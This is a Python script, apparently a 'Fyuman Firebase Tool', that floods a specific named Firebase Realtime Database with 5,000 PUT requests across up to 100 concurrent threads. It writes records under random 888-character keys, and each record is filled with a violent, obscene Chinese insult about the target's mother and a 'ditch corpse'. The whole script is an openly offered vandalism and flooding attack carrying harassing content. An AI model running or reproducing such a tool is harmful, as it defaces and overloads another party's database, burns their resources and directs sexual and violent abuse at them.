import requests
import random
import string
import time
import concurrent.futures

def generate_random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

firebase_url = 'https://fyuman-96017-default-rtdb.firebaseio.com/'

def create_record(random_key, counter):
    data = {
        '我会让你妈妈用我的阴茎做红色的操，就像你在大自然中对我咆哮一样，这样我就可以以某种方式与你的沟渠尸体一起玩，我将用我的阴茎操': '我会让你妈妈用我的阴茎做红色的操，就像你在大自然中对我咆哮一样，这样我就可以以某种方式与你的沟渠尸体一起玩，我将用我的阴茎操',
        '我会让你妈妈用我的阴茎做红色的操，就像你在大自然中对我咆哮一样，这样我就可以以某种方式与你的沟渠尸体一起玩，我将用我的阴茎操': '我会让你妈妈用我的阴茎做红色的操，就像你在大自然中对我咆哮一样，这样我就可以以某种方式与你的沟渠尸体一起玩，我将用我的阴茎操'
    }
    response = requests.put(firebase_url + '/documents/' + random_key + '.json', json=data)
    counter.append(1)

    return response.json()

def create_records(concurrent_speed=1):
    counter = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrent_speed) as executor:
        futures = []
        for i in range(5000):  
            random_key = generate_random_string(888)
            futures.append(executor.submit(create_record, random_key, counter))

        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            print(result)

    return counter

print("""
█▀▀ █▄█ █░█ █▀▄▀█ ▄▀█ █▄░█
█▀░ ░█░ █▄█ █░▀░█ █▀█ █░▀█

█▀▀ █ █▀█ █▀▀ █▄▄ ▄▀█ █▀ █▀▀
█▀░ █ █▀▄ ██▄ █▄█ █▀█ ▄█ ██▄

▀█▀ █▀█ █▀█ █░░
░█░ █▄█ █▄█ █▄▄
""")

time.sleep(10)

concurrent_speed = input("Введите скорость concurrent (от 1 до 100): ")
concurrent_speed = min(100, max(1, int(concurrent_speed)))

print("HARD")

counter = create_records(concurrent_speed)

print("Количество:", len(counter))

print("все нахуй")